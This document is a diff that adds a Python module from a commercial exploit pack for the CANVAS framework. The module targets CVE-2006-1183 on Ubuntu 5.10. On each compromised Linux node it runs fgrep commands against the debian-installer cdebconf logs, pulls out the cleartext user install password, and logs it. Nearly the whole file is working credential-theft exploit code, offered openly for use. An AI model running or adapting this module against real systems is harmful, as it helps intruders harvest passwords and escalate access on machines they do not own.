@@ -1,0 +1,76 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007
+#
+
+import sys
+
+sys.path.append(".")
+sys.path.append("../../")
+
+from canvasexploit import canvasexploit
+import canvasengine
+
+from exploitutils import *
+import libs.canvasos as canvasos
+
+
+NAME = "Administrator root password readable Exploit"
+VERSION = "0.1"
+DESCRIPTION = "Administrator root password readable in cleartext on Breezy"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Exploit"
+PROPERTY['SITE'] = "Local"
+PROPERTY['ARCH'] = [ ["Linux"] ]
+
+DOCUMENTATION = {}
+DOCUMENTATION["Date public"] = "2006/12/03"
+DOCUMENTATION["VersionsAffected"] = "Ubuntu 5.10"
+DOCUMENTATION["References"] = "http://www.securityfocus.com/bid/17086"
+DOCUMENTATION["CVE Name"] = "CVE 2006-1183"
+DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=2006-1183"
+
+class theexploit (canvasexploit):
+    
+	def __init__(self):
+		canvasexploit.__init__(self)
+		self.setInfo(DESCRIPTION)
+		self.name = NAME
+		self.installer = "/var/log/installer/cdebconf"
+		self.debinstaller = "/var/log/debian-installer/cdebconf"
+		return
+
+	def run(self):
+		self.setInfo("%s (in progress)"%(NAME))
+
+		for node in self.argsDict["passednodes"]:
+			type = node.nodetype
+			nodename = node.getname()
+			caps = node.capabilities
+
+			if "linux" not in caps:
+				self.log("Node %s not a Linux node..."%nodename)
+				continue
+
+			self.log("Node %s is a linux node, continuing"%nodename)
+
+			data = "User install password:\n"
+			data += node.runcommand("fgrep -r -i -B 2 'passwd/user-password' %s/*|grep 'Value'" % self.installer)
+			data += node.runcommand("fgrep -r -i -B 2 'passwd/user-password-again' %s/*|grep 'Value'" % self.installer)
+			data += node.runcommand("fgrep -r -i -B 2 'passwd/user-password' %s/*|grep 'Value'" % self.debinstaller)
+			data += node.runcommand("fgrep -r -i -B 2 'passwd/user-password-again' %s/*|grep 'Value'" % self.debinstaller)
+
+			self.log(data)
+
+			self.setInfo("%s (finished)"%(NAME))
+
+			return 1
+
+if __name__=="__main__":
+    print "This module is meant to be run only within CANVAS"
+
